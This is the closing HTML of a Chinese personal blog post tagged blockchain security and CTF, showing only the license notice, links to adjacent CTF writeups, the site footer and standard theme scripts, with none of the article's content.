    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/09/08/26/" rel="prev" title="2021WMCTF 1+2=3 复现">
                  <i class="fa fa-chevron-left"></i> 2021WMCTF 1+2=3 复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/09/12/28/" rel="next" title="羊城杯2021 Crypto Writeup">
                  羊城杯2021 Crypto Writeup <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Zpano</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">206k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">3:07</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>















  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








  

  
      <script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              const target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
    script.defer = true;
    document.head.appendChild(script);
  } else {
    MathJax.startup.document.state(0);
    MathJax.typesetClear();
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
